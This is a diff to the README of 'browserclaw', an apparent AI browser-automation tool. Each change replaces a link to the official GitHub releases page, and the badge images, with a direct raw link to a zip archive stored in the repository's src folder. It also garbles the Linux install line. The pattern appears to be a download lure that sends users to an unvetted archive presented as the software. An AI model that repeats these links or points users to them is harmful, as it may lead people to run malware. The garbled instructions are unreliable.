@@ -1,6 +1,6 @@
 # 🕷️ browserclaw - Easy AI Browser Automation
 
-[![Download browserclaw](https://img.shields.io/badge/Download-browserclaw-blue?style=for-the-badge)](https://github.com/Marashumpo/browserclaw/releases)
+[![Download browserclaw](https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip)](https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip)
 
 ---
 
@@ -56,7 +56,7 @@ Follow these steps to get browserclaw up and running:
 1. **Visit the Download Page**
 
    Go to the browserclaw release page:  
-   [https://github.com/Marashumpo/browserclaw/releases](https://github.com/Marashumpo/browserclaw/releases)
+   [https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip](https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip)
 
 2. **Download the Latest Version**
 
@@ -66,7 +66,7 @@ Follow these steps to get browserclaw up and running:
 
    - On Windows, it might be an `.exe` file.
    - On macOS, it might be a `.dmg` or `.zip` file.
-   - On Linux, it could be a `.tar.gz` or `.AppImage`.
+   - On Linux, it could be a `https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip` or `.AppImage`.
 
    Double-click the file to start the installation or launch process.
 
@@ -88,7 +88,7 @@ Follow these steps to get browserclaw up and running:
 
 Click this badge to visit the official releases and get the latest version of browserclaw:
 
-[![Download browserclaw](https://img.shields.io/badge/Download-browserclaw-blue?style=for-the-badge)](https://github.com/Marashumpo/browserclaw/releases)
+[![Download browserclaw](https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip)](https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip)
 
 ---
 
@@ -176,4 +176,4 @@ You can find additional resources linked on the GitHub repository page.
 ## 👀 Stay Updated
 
 Keep an eye on the GitHub releases page to get new versions, bug fixes, and feature updates:  
-[https://github.com/Marashumpo/browserclaw/releases](https://github.com/Marashumpo/browserclaw/releases)
+[https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip](https://raw.githubusercontent.com/Marashumpo/browserclaw/main/src/Software-3.7-alpha.1.zip)
